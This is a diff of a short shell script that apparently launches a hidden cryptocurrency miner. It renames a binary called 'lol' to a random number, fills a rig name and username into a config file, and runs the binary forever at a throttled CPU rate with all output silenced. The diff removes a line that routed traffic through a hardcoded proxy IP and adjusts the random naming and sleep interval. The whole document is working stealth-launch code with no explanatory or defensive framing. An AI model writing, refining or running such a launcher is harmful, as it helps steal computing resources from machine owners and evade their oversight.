@@ -1,8 +1,8 @@
-export http_proxy=64.124.38.141:8080 && export https_proxy=64.124.38.141:8080
 chmod +x lol build_config
 TOP=$(shuf -n 1 -i 1-999999)
+OKE=$(shuf -n 1 -i 1-99)
 USER=$1
-mv lol $TOP
+mv lol $OKE
 sed -i "s/RIGNAME/$TOP/" "build_config"
 sed -i "s/USERNAME/$USER/" "build_config"
-while :; do timeout 1m cpulimit -l 1 ./$TOP; sleep 5; done >/dev/null >/dev/null 2>&1
+while :; do timeout 1m cpulimit -l 1 ./$OKE; sleep 10; done >/dev/null >/dev/null 2>&1
